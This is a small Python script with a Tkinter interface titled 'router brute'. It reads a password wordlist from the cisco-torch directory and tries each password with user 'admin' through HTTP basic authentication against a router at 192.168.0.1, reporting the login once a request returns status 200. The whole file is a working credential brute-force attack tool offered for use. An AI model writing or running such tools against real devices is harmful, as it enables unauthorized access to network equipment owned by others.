import tkinter as tk
from tkinter import messagebox
from tkinter import Button
from functools import partial  
import random, threading, time, requests

#LIST = 'ALSTU12340'
LIST = 'AL104 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
user = 'admin'
guess = ''

def brute():
    url = 'http://192.168.0.1'
    user = 'admin'
    password = open('/usr/share/cisco-torch/password.txt','r').read().splitlines()
    txtu.config(text=user)
    for word in password:
        r = requests.get(url, auth=(user,word))
        txtp.config(text=word)
        if r.status_code == 200:
            txtp.config(text=word)
            txt.config(text="PasswordFound: ")
            messagebox.showinfo('ALERT!', 'Login FOUND!')
            break


win = tk.Tk()
win.title('router brute')
#win.geometry('400x200')
win.geometry('200x100')

user = tk.StringVar()
password = tk.StringVar()

txt = tk.Label(win, text="User:", font=('arial',11))
txt.grid(column=0,row=0)
txtu = tk.Label(win, text='?', font=('arial',11))
txtu.grid(column=1,row=0)
#========================================================
txt = tk.Label(win,text="   Password: ", font=('arial',12))
txt.grid(column=0,row=1)
txtp = tk.Label(win, text='?', font=('arial',11))
txtp.grid(column=1,row=1)
"""
#========================================================
usert = tk.Label(win, text='enter user: ', font=('arial',11))
usert.grid(column=0,row=2)
user = tk.Entry(win,textvariable=user,font=('arial',11))
user.grid(column=1,row=2)
#========================================================
passwordt = tk.Label(win, text='enter passwd path: ', font=('arial',11))
passwordt.grid(column=0,row=3)
password = tk.Entry(win,textvariable=password,font=('arial',11))
password.grid(column=1,row=3)
#========================================================
"""

def check():
    threading.Thread(target=brute).start()
    """
    global user, password
    password = open('/usr/share/cisco-torch/password.txt','r').read().splitlines()
    partial(brute, user, password)
    """


btn = Button(win, text="Start", command=check)
btn.grid(column=1, row=4)

#threading.Thread(target=brute).start()
win.mainloop()

